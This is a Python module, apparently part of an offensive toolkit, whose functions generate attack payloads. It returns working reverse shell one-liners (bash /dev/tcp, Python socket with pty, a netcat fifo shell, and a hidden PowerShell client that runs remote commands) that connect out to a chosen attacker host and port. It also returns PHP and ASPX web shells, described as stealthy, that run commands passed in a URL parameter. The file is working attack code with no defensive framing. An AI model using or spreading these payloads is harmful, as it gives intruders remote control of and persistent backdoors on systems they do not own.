# core/tools/payload_factory.py
import base64

def gerar_reverse_shell(os_family, lhost, lport, type="bash"):
    """Gera payloads de shell reverso baseados no sistema operacional."""
    os_family = (os_family or "linux").lower()
    
    payloads = {
        "linux": {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        },
        "windows": {
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
    }
    
    family_payloads = payloads.get(os_family, payloads["linux"])
    return family_payloads.get(type, family_payloads.get(list(family_payloads.keys())[0]))

def gerar_web_shell(tech_stack):
    """Gera web shells furtivas (stealth)."""
    tech_stack = (tech_stack or "php").lower()
    shells = {
        "php": "<?php system($_GET['cmd']); ?>",
        "aspx": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request.QueryString[\"cmd\"]); %>"
    }
    return shells.get(tech_stack, shells["php"])
